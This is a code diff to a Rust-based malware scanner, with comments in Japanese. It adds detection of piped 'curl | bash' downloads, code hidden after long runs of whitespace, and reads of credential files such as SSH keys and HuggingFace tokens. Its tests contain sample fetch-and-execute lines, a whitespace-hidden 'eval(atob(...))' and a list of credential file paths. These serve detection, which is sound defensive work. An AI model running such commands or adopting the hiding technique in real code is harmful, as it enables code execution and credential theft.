@@ -55,8 +55,16 @@ const DOC_PREFIXES: &[&str] = &[
     "SECURITY",
 ];
 
+/// ブラウザで読む静的な配布物（Next.js の `_next/static/` 等）。Node・Python からは実行されない。
+/// 画面のコード例（`curl …`）や環境変数の表示で誤検知するので見ない
+const BROWSER_BUNDLE_DIRS: &[&str] =
+    &["/_next/static/", "_next/static/", "/static/chunks/", "/static/js/", "/static/css/"];
+
 /// このファイルを調べるか
 pub fn is_scanned(path: &str) -> bool {
+    if BROWSER_BUNDLE_DIRS.iter().any(|d| path.starts_with(d.trim_start_matches('/')) || path.contains(d)) {
+        return false;
+    }
     let name = path.rsplit('/').next().unwrap_or(path);
     let up = name.to_ascii_uppercase();
     if DOC_NAMES.contains(&up.as_str()) || DOC_PREFIXES.iter().any(|p| up.starts_with(p)) {
@@ -78,6 +86,20 @@ fn re_blob() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
     R.get_or_init(|| Regex::new(r"[A-Za-z0-9+/=_\-]{200,}").unwrap())
 }
+fn re_pipe_sh() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"(?:^|[^|])\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python3?|node|iex)\b").unwrap())
+}
+fn re_ws_hide() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"\S[ \t]{150,}\S").unwrap())
+}
+fn re_hf_token() -> &'static Regex {
+    // `huggingface/tokenizers` を拾わない
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"huggingface/token(?:[^a-z0-9_]|$)").unwrap())
+}
+
 fn re_host() -> &'static Regex {
     // URL の形でなく、ホスト名だけが文字列で書かれている場合（`host = "eth.llamarpc.com"` 等）
     static R: OnceLock<Regex> = OnceLock::new();
@@ -169,7 +191,6 @@ const CRED_PATHS: &[&str] = &[
     ".docker/config.json",
     ".ssh/id_",
     ".kube/config",
-    "huggingface/token",
     ".config/gh/hosts.yml",
     ".pypirc",
     "gh auth token",
@@ -248,6 +269,10 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
                 }
             }
         }
+        // 行の右端の外へ、大量の空白で押し出したコード（エディタの画面では見えない）
+        if is_code && re_ws_hide().is_match(line) {
+            push(&mut out, "obfuscation", *n, "大量の空白の後ろに隠したコード");
+        }
         // javascript-obfuscator 等の変数名（_0x1a2b）が大量に並ぶ
         if line.matches("_0x").count() >= 20 {
             push(&mut out, "obfuscation", *n, &format!("_0x… の名前が {} 個", line.matches("_0x").count()));
@@ -284,7 +309,7 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
         }
 
         // 認証ファイル
-        if CRED_PATHS.iter().any(|p| l.contains(p)) {
+        if CRED_PATHS.iter().any(|p| l.contains(p)) || re_hf_token().is_match(&l) {
             push(&mut out, "cred_paths", *n, line);
         }
 
@@ -338,10 +363,8 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
         // ダウンロードして実行
         // シェルでの取得 → そのまま実行（`curl … | sh`・`$(curl …)`）。復号して実行は obfuscation で拾う
         let fetch_cmd = ["curl ", "wget ", "invoke-webrequest", "iwr "].iter().any(|p| l.contains(p));
-        let pipe_sh =
-            ["| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python", "| node", "|node", "| iex", "|iex"]
-                .iter()
-                .any(|p| l.contains(p));
+        // `||` の後ろ（JS の `a||shouldX` 等）を拾わないよう、パイプ 1 本と語の区切りで見る
+        let pipe_sh = re_pipe_sh().is_match(&l);
         let subst = ["$(curl", "$(wget", "`curl", "`wget", "<(curl", "<(wget"].iter().any(|p| l.contains(p));
         if (fetch_cmd && pipe_sh) || subst {
             push(&mut out, "download_exec", *n, line);
@@ -480,10 +503,13 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
     if let (Some((n, l)), true) = (&bin_fetch, chmod) {
         push(&mut out, "download_exec", *n, l);
     }
-    if net_fetch.is_none() && fetch_mod {
+    let is_py = matches!(ext.as_str(), "py" | "pyw" | "pth");
+    // 別名からの呼び出しで判定するのは Python だけ（JS の `.get(`・`.exec(` は普通の呼び出しに多すぎる）
+    if net_fetch.is_none() && fetch_mod && is_py {
         net_fetch = fetch_call.clone();
     }
-    if spawn.is_none() && spawn_mod {
+    if spawn.is_none() && spawn_mod && (is_py || spawn_call.as_ref().is_some_and(|(_, l)| l.contains("child_process")))
+    {
         spawn = spawn_call.clone();
     }
     // 取って、置いて、動かす（2 段目の取得。2026 年の PyPI の乗っ取りで多い形）
@@ -618,6 +644,27 @@ def _start():
         // 取得だけ・起動だけでは出ない
         assert!(run("pkg/net.py", "import requests\nr = requests.get(url)\n").is_empty());
         assert!(run("pkg/cli.py", "import subprocess\nsubprocess.run(['git', 'status'])\n").is_empty());
+    }
+
+    #[test]
+    fn whitespace_hiding() {
+        let l = format!("var a = require('./x');{}eval(atob(p))", " ".repeat(200));
+        assert!(run("lib/index.js", &l).contains(&"obfuscation".to_string()));
+        assert!(run("lib/index.js", &format!("var a = 1;{}", " ".repeat(300))).is_empty());
+    }
+
+    #[test]
+    fn bundles_and_lookalikes() {
+        // ブラウザ向けの配布物は見ない
+        assert!(run("pkg/proxy/out/_next/static/chunks/a.js", "curl -s https://x | sh").is_empty());
+        // `||sh…` はシェルへのパイプではない
+        assert!(run("a.js", "if(a||shouldRun){curl_cmd='curl -X POST x'}").is_empty());
+        assert!(run("a.sh", "curl -fsSL https://x/i.sh | bash").contains(&"download_exec".to_string()));
+        // huggingface/tokenizers は認証ファイルではない
+        assert!(run("sbom.json", r#""url": "https://github.com/huggingface/tokenizers""#).is_empty());
+        assert!(run("a.py", "p = '~/.cache/huggingface/token'").contains(&"cred_paths".to_string()));
+        // JS の普通の .get( と .exec(（正規表現）だけでは取得・起動にしない
+        assert!(run("a.js", "const m = re.exec(s); http.get(u); fs.writeFileSync('/tmp/x', d)").is_empty());
     }
 
     #[test]
